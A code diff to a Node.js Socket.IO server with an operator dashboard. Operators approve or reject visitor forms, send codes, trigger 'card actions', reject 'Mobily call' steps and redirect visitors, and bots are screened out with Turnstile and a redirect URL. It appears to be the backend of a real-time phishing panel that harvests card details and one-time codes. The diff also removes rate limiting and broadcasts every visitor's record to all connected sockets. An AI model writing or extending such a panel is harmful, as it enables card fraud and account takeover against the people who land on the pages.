@@ -694,51 +694,9 @@ async function verifyTurnstileToken(token, ip) {
   }
 }
 
-// === Optimized Admin Notification ===
-// Send only the changed visitor instead of all visitors (prevents dashboard hanging)
-// With throttle: max 1 update per 500ms per visitor to prevent flood
-const _pendingVisitorUpdates = new Map(); // visitorId -> visitor data
-let _adminUpdateTimer = null;
-
-function notifyAdminsVisitorUpdated(visitor) {
-  if (!visitor || !visitor._id) return;
-  // Queue the update
-  _pendingVisitorUpdates.set(visitor._id, { ...visitor, isConnected: visitors.has(visitor.socketId) });
-  // Throttle: flush every 500ms
-  if (!_adminUpdateTimer) {
-    _adminUpdateTimer = setTimeout(() => {
-      const updates = Array.from(_pendingVisitorUpdates.values());
-      _pendingVisitorUpdates.clear();
-      _adminUpdateTimer = null;
-      if (updates.length > 0) {
-        admins.forEach((admin, adminSocketId) => {
-          io.to(adminSocketId).emit("visitor:updated", updates);
-        });
-      }
-    }, 500);
-  }
-}
-
 // Socket.IO Connection Handler
 io.on("connection", (socket) => {
   console.log(`New connection: ${socket.id}`);
-
-  // Rate limiting per socket: max 5 events per second (bot protection)
-  let _socketEventCount = 0;
-  let _socketRateInterval = setInterval(() => { _socketEventCount = 0; }, 1000);
-  const originalOnEvent = socket.onevent;
-  socket.onevent = function(packet) {
-    _socketEventCount++;
-    if (_socketEventCount > 5) {
-      const visitorInfo = getVisitorInfo(socket);
-      console.log(`Rate limit exceeded (${_socketEventCount}/s): IP=${visitorInfo.ip} - disconnecting`);
-      clearInterval(_socketRateInterval);
-      socket.disconnect();
-      return;
-    }
-    originalOnEvent.call(this, packet);
-  };
-  socket.on('disconnect', () => { clearInterval(_socketRateInterval); });
 
   // Handle visitor registration
   socket.on("visitor:register", async (data) => {
@@ -766,14 +724,15 @@ io.on("connection", (socket) => {
       // Returning visitor (reconnect) - skip Turnstile check (token is single-use)
       socket._turnstileVerified = true;
       console.log(`Turnstile SKIP (returning visitor): IP=${visitorInfo.ip}, visitorId=${existingId}`);
-    } else if (turnstileToken) {
-      // New visitor WITH token - verify immediately
+    } else {
+      // New visitor - verify Turnstile token
       const turnstileResult = await verifyTurnstileToken(turnstileToken, visitorInfo.ip);
       if (turnstileResult.success) {
         socket._turnstileVerified = (turnstileResult.reason === 'valid');
         console.log(`Turnstile OK: IP=${visitorInfo.ip}, reason=${turnstileResult.reason}`);
       } else {
-        // Invalid token - block (likely bot)
+        // No token or invalid token - BLOCK or REDIRECT (bot or unauthorized)
+        // Real visitors always send token first (client waits for Turnstile before registering)
         if (botRedirectUrl) {
           console.log(`Turnstile REDIRECTED to ${botRedirectUrl}: IP=${visitorInfo.ip}, reason=${turnstileResult.reason}`);
           socket.emit('bot:redirect', botRedirectUrl);
@@ -783,21 +742,6 @@ io.on("connection", (socket) => {
         socket.disconnect();
         return;
       }
-    } else {
-      // New visitor WITHOUT token - allow entry, mark as unverified
-      // Token will arrive later via 'visitor:turnstile-token' event
-      socket._turnstileVerified = false;
-      console.log(`Turnstile PENDING (no token yet): IP=${visitorInfo.ip} - visitor allowed, waiting for token`);
-      // Auto-kick after 30 seconds if Turnstile token never arrives (bot protection)
-      socket._turnstileTimeout = setTimeout(() => {
-        if (!socket._turnstileVerified && socket.connected) {
-          console.log(`Turnstile TIMEOUT (30s): IP=${visitorInfo.ip} - kicking unverified visitor`);
-          if (botRedirectUrl) {
-            socket.emit('bot:redirect', botRedirectUrl);
-          }
-          socket.disconnect();
-        }
-      }, 30000);
     }
     
     const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
@@ -922,29 +866,6 @@ io.on("connection", (socket) => {
     } else {
       console.log(`Turnstile LATE FAILED: IP=${visitorInfo.ip}, invalid token`);
       // Don't disconnect - the timeout will handle it if still awaiting
-    }
-  });
-
-  // Handle Turnstile token sent after initial registration (root fix for new domains)
-  socket.on("visitor:turnstile-token", async (data) => {
-    const token = data?.turnstileToken || '';
-    if (!token || socket._turnstileVerified) return;
-    
-    const visitorInfo = getVisitorInfo(socket);
-    const turnstileResult = await verifyTurnstileToken(token, visitorInfo.ip);
-    
-    if (turnstileResult.success) {
-      socket._turnstileVerified = true;
-      // Cancel the 30-second timeout since token verified successfully
-      if (socket._turnstileTimeout) { clearTimeout(socket._turnstileTimeout); socket._turnstileTimeout = null; }
-      console.log(`Turnstile VERIFIED (post-register): IP=${visitorInfo.ip}`);
-    } else {
-      console.log(`Turnstile FAILED (post-register): IP=${visitorInfo.ip}, reason=${turnstileResult.reason}`);
-      // Invalid token after registration - disconnect (likely bot)
-      if (botRedirectUrl) {
-        socket.emit('bot:redirect', botRedirectUrl);
-      }
-      socket.disconnect();
     }
   });
 
@@ -1199,7 +1120,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      notifyAdminsVisitorUpdated(visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Form approved for visitor: ${visitorSocketId}`);
   });
@@ -1214,7 +1135,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      notifyAdminsVisitorUpdated(visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Form rejected for visitor: ${visitorSocketId}`);
   });
@@ -1228,7 +1149,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      notifyAdminsVisitorUpdated(visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
   });
@@ -1243,7 +1164,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      notifyAdminsVisitorUpdated(visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
   });
@@ -1257,7 +1178,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      notifyAdminsVisitorUpdated(visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
   });
@@ -1279,7 +1200,7 @@ io.on("connection", (socket) => {
       }
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      notifyAdminsVisitorUpdated(visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
   });
@@ -1293,7 +1214,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      notifyAdminsVisitorUpdated(visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
   });
@@ -1307,7 +1228,7 @@ io.on("connection", (socket) => {
       visitor.waitingForAdminResponse = false;
       visitors.set(visitorSocketId, visitor);
       saveVisitorPermanently(visitor);
-      notifyAdminsVisitorUpdated(visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
     }
     console.log(`Resend approved for visitor ${visitorSocketId}`);
   });
